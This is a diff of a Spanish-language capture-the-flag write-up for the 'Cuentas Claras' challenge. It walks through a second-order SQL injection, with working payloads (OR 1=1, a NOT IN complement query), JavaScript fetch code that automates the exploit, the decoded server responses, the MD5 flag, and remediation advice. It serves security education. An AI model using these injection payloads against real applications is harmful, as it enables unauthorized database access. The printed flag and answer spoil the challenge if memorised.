@@ -1,139 +1,146 @@
-# Desafío - Cuentas Claras (HackLab)
+# Writeup — Cuentas Claras (HackLab 2026)
 
 **Plataforma:** HackLab (SoftwareSeguro)  
 **Edición:** HackLab 2026  
-**Categoría:** SQLi (Second-Order / Inyección en campo almacenado)  
-**Autor:** adonaissh  
+**Categoría:** SQLi (Second-Order / Inyección en campo almacenado)    
+**Puntaje:** 30 pts  
+**Flag:** `0ffd15f002b98f6bd62346b947b8d15a`  
 
 ---
 
-## 📌 Enunciado
+## 📌 Enunciado y Descripción
 
-> **Cuentas Claras** es una herramienta interna de contaduría para alta de proveedores y reportes de movimientos.
+> **Cuentas Claras** es una herramienta interna de contaduría.
 >
-> Hay 20 categorías en el sistema, pero el selector de la interfaz solo permite elegir 17: existen **3 categorías restringidas** a las que no se puede dar de alta proveedores (no figuran en el selector ni el backend las acepta directamente). No obstante, esas 3 categorías poseen movimientos cargados.
+> Hay 20 categorías en la base de datos, pero el selector solo te deja elegir 17: existen **3 categorías restringidas** a las que no se puede dar de alta proveedores (ni aparecen en el selector ni el servidor las acepta). Esas 3 categorías igual tienen movimientos cargados.
 >
-> **Objetivo:** Averiguar cuántos movimientos hay en las 3 categorías restringidas, sumarlos, y calcular el hash MD5 de dicha suma para ingresarlo como flag en el juez.
+> **Objetivo:** Averiguar cuántos movimientos hay en las 3 categorías restringidas, sumarlos, y calcular el hash MD5 de esa suma como flag.
 
 ---
 
-## 🔍 Análisis Inicial y Reconocimiento
+## 🔍 Reconocimiento
 
-La aplicación web consta de un formulario para dar de alta proveedores (`POST /alta`) con los siguientes campos:
-- **Nombre del proveedor**
-- **Categoría** (selector con 17 opciones visibles)
+La aplicación web tiene dos endpoints principales:
 
-Listado de las 17 categorías permitidas en el selector:
-1. `Capacitacion`
-2. `Catering`
-3. `Consultoria`
-4. `Insumos`
-5. `Limpieza`
-6. `Logistica`
-7. `Mantenimiento`
-8. `Marketing`
-9. `Mobiliario`
-10. `Papeleria`
-11. `Seguridad`
-12. `Servicios`
-13. `Software`
-14. `Tecnologia`
-15. `Telefonia`
-16. `Transporte`
-17. `Viaticos`
+- `POST /alta` — Da de alta un proveedor con los campos `nombre` y `categoria`.
+- `POST /movimientos/<id>` — Devuelve la cantidad de movimientos registrados para ese proveedor.
 
-En la tabla inferior se listan los proveedores creados. Cada fila cuenta con un botón **"Ver cantidad movimientos"**, el cual dispara una petición HTTP:
+El selector HTML lista 17 categorías permitidas:
 
-```http
-POST /movimientos/<id>
+```text
+Capacitacion, Catering, Consultoria, Insumos, Limpieza, Logistica,
+Mantenimiento, Marketing, Mobiliario, Papeleria, Seguridad, Servicios,
+Software, Tecnologia, Telefonia, Transporte, Viaticos
 ```
 
-El servidor responde con un redirect `302 FOUND` a `/` y almacena en la cookie de sesión (`session=...`) un mensaje flash codificado en base64:
-- Decodificación base64 típica: `{"_flashes":[{" t":["ok","Proveedor #3: 1897 movimientos registrados."]}]}`.
+Intentar dar de alta un proveedor enviando en `categoria` un valor inventado devuelve:
+
+```text
+Categoría inválida o restringida: no se pueden agregar proveedores en esa categoría.
+```
+
+El servidor devuelve exactamente el mismo mensaje tanto para categorías inexistentes como para las restringidas, por lo que **no es posible enumerar las restringidas por diferencia de error**.
 
 ---
 
-## 🔬 Identificación de la Vulnerabilidad (SQLi de Segundo Orden)
+## 🔬 Identificación de la Vulnerabilidad
 
-### 1. Detección del punto de inyección
+Al probar payloads de inyección SQL en el campo `nombre`:
 
-Al dar de alta un proveedor con una comilla simple en el nombre:
-- **Nombre:** `Test'`
-- **Categoría:** `Catering`
-
-Al presionar "Ver cantidad movimientos" (`POST /movimientos/4`), el servidor retornó en la cookie de sesión el siguiente error:
-```json
-{"_flashes":[{" t":["error","No se pudo contar los movimientos para ese proveedor."]}]}
-```
-Esto demostró que el error ocurrió en la consulta de conteo interna provocada por la comilla sin escapar.
-
-### 2. Confirmación con comentario SQL
-
-Se probó cerrar la comilla y comentar el resto de la query:
-- **Nombre:** `x' -- `
-- Al consultar los movimientos (`POST /movimientos/5`), el servidor respondió:
 ```text
-Proveedor #5: 0 movimientos registrados.
+nombre = test'--
+nombre = test' OR '1'='1
 ```
-No hubo error sintáctico. La consulta fue válida pero buscó el proveedor literal `'x'`, confirmando que la consulta de conteo en `/movimientos/<id>` se arma mediante concatenación dinámica del nombre del proveedor recuperado de la base de datos (inyección SQL de segundo orden).
+
+Ambos valores se insertan en la BD sin sanitizar y aparecen reflejados en la tabla de proveedores. El campo `categoria` sí es validado estrictamente en el backend, pero `nombre` no cuenta con validación ni escape.
+
+Esto constituye una **inyección SQL de segundo orden (Stored / Second-Order SQLi)**: el payload malicioso se almacena de forma inofensiva durante el primer request (`/alta`) y se ejecuta recién en un request posterior (`/movimientos/<id>`), cuando el servidor recupera el nombre guardado y lo concatena en una segunda query a la base de datos.
 
 ---
 
-## 🚀 Explotación
+## 🚀 Explotación Paso a Paso
 
-### 1. Verificación de control total sobre el `WHERE`
+### Paso 1 — Confirmar la inyección de segundo orden
 
-Para verificar que la condición inyectada evaluaba la tabla completa de movimientos, se creó un proveedor forzando una condición booleana siempre verdadera:
+Al dar de alta un proveedor con nombre `x' OR '1'='1` y luego consultar sus movimientos:
 
-- **Nombre:** `x' OR 1=1 -- `
-- **Categoría:** `Catering`
-- **Petición ejecutada:** `POST /movimientos/6`
-
-**Respuesta decodificada de la cookie de sesión:**
-```text
-Proveedor #6: 51340 movimientos registrados.
-```
-Se obtuvieron exitosamente los 51.340 movimientos totales existentes en la base de datos.
-
-### 2. Extracción directa de las 3 categorías restringidas
-
-Dado que se conocían exactamente las 17 categorías visibles y el objetivo era contar los movimientos de las 3 categorías restantes no permitidas, se diseñó un payload utilizando el operador `NOT IN`:
-
-- **Payload en Nombre del proveedor:**
-  ```sql
-  x' OR categoria NOT IN ('Capacitacion','Catering','Consultoria','Insumos','Limpieza','Logistica','Mantenimiento','Marketing','Mobiliario','Papeleria','Seguridad','Servicios','Software','Tecnologia','Telefonia','Transporte','Viaticos') -- 
-  ```
-- **Categoría elegida:** `Catering` (cualquiera del selector)
-
-Se dio de alta el proveedor (generando el ID #7) y se ejecutó la consulta:
-
-```http
-POST /movimientos/7 HTTP/1.1
-Host: chl-d0bc8860-208a-4b7a-b5ef-02748794ee76-cuentas-claras.b.softwareseguro.com.ar
+```javascript
+fetch('/alta', {
+  method: 'POST',
+  headers: {'Content-Type': 'application/x-www-form-urlencoded'},
+  body: "nombre=x' OR '1'='1&categoria=Catering"
+});
 ```
 
-**Respuesta del servidor:**
-```http
-HTTP/1.1 302 FOUND
-Set-Cookie: session=eyJfZmxhc2hlcyI6W3siIHQiOlsib2siLCJQcm92ZWVkb3IgIzc6IDk3NjMgbW92aW1pZW50b3MgcmVnaXN0cmFkb3MuIl19XX0...
-Location: /
+La respuesta de `/movimientos/<id>` devuelve **51.340 movimientos**, que corresponde al total absoluto de movimientos de todas las categorías en la base de datos. La condición `OR '1'='1` hace que la cláusula `WHERE` sea siempre verdadera.
+
+Esto confirma que la consulta interna ejecutada por el servidor es equivalente a:
+
+```sql
+SELECT COUNT(*) FROM movimientos WHERE proveedor = '<nombre>'
 ```
 
-Decodificando el contenido del flash en base64:
-```text
-Proveedor #7: 9763 movimientos registrados.
+Donde `<nombre>` es sustituido dinámicamente con el valor guardado en la base de datos, sin parametrizar ni escapar.
+
+---
+
+### Paso 2 — Contar movimientos de las 3 categorías restringidas
+
+Dado que se conocen las 17 categorías visibles y el total es 20, en vez de adivinar o forzar por fuerza bruta los nombres de las 3 categorías restringidas, se construye un payload que selecciona el complemento excluyendo las 17 permitidas mediante el operador `NOT IN`:
+
+```javascript
+const conocidas = [
+  'Capacitacion', 'Catering', 'Consultoria', 'Insumos', 'Limpieza',
+  'Logistica', 'Mantenimiento', 'Marketing', 'Mobiliario', 'Papeleria',
+  'Seguridad', 'Servicios', 'Software', 'Tecnologia', 'Telefonia',
+  'Transporte', 'Viaticos'
+];
+const lista = conocidas.map(c => `'${c}'`).join(',');
+
+const payload = `x' OR categoria NOT IN (${lista}) AND '1'='1`;
+
+// 1. Dar de alta el proveedor con el payload en el nombre
+const r1 = await fetch('/alta', {
+  method: 'POST',
+  headers: {'Content-Type': 'application/x-www-form-urlencoded'},
+  body: `nombre=${encodeURIComponent(payload)}&categoria=Catering`
+});
+const t1 = await r1.text();
+const id = t1.match(/class="idcol">(\d+)/)?.[1];
+
+// 2. Consultar los movimientos del proveedor creado
+const r2 = await fetch(`/movimientos/${id}`, {method: 'POST'});
+const t2 = await r2.text();
+console.log(t2.match(/class="flash[^"]*">(.*?)<\/div>/s)?.[1]);
 ```
 
-La suma exacta de movimientos registrados en las 3 categorías restringidas es **9763**.
+La query resultante ejecutada en el motor de base de datos es:
 
-### 3. Generación del Hash MD5
+```sql
+SELECT COUNT(*) FROM movimientos
+WHERE proveedor = 'x'
+   OR categoria NOT IN ('Capacitacion','Catering',...,'Viaticos')
+  AND '1'='1'
+```
 
-Calculando el hash MD5 de la suma obtenida (`9763`):
+Resultado de la consulta: **9.763 movimientos** en las 3 categorías restringidas.
 
+---
+
+### Paso 3 — Calcular la Flag
+
+Con la suma obtenida (`9763`), se genera su hash MD5:
+
+```bash
+echo -n "9763" | md5sum
+# 0ffd15f002b98f6bd62346b947b8d15a
+```
+
+O en Python:
 ```python
 import hashlib
 print(hashlib.md5("9763".encode()).hexdigest())
-# -> 0ffd15f002b98f6bd62346b947b8d15a
+# 0ffd15f002b98f6bd62346b947b8d15a
 ```
 
 ---
@@ -146,10 +153,10 @@ print(hashlib.md5("9763".encode()).hexdigest())
 
 ---
 
-## 🛡️ Causa Raíz y Recomendaciones
+## 💡 Lecciones Aprendidas y Remediación
 
-- **Causa Raíz:** Inyección SQL de segundo orden (Second-Order SQL Injection). Si bien la inserción del proveedor en `/alta` se realizaba correctamente con sentencias preparadas, la lógica posterior en `/movimientos/<id>` recuperaba el campo `nombre` almacenado y lo concatenaba directamente dentro de una sentencia SQL de conteo (`SELECT COUNT(*) FROM movimientos WHERE proveedor = '{nombre}' ...`), permitiendo que el input previamente almacenado altere la lógica de la consulta.
-- **Recomendaciones:**
-  - **Consultas parametrizadas en todo el ciclo de vida:** Utilizar sentencias preparadas (Prepared Statements) con parámetros vinculados tanto en la escritura como en la lectura y conteo de datos.
-  - **Relacionamiento por ID:** Vincular las tablas de `proveedores` y `movimientos` mediante claves foráneas numéricas (`proveedor_id`) en lugar de buscar por nombres en formato texto.
-  - **Validación de entradas:** Implementar listas blancas en el backend para caracteres válidos en campos de texto (rechazando comillas o caracteres especiales de control SQL).
+- **Naturaleza de la SQLi de Segundo Orden:** Es considerablemente más difícil de detectar mediante escaneos superficiales porque el ingreso del payload (`/alta`) y su detonación (`/movimientos/<id>`) están desacoplados en el tiempo y en distintas funcionalidades. El endpoint donde se inyecta el dato no produce un error inmediato.
+- **Técnica del complemento (`NOT IN`):** Cuando el espacio de valores válidos o conocidos es acotado (17 de 20), usar la negación del conjunto conocido permite consultar los datos restringidos directamente sin necesidad de extraer o adivinar sus identificadores.
+- **Remediación:**
+  - **Consultas parametrizadas (Prepared Statements):** Utilizar parámetros vinculados (`?` o `$1`) tanto al escribir como al consultar datos derivados de la base.
+  - **Normalización de modelos relacionales:** Vincular tablas mediante claves foráneas numéricas (`proveedor_id INT`) en lugar de almacenar cadenas de texto como identificadores en la tabla de movimientos.
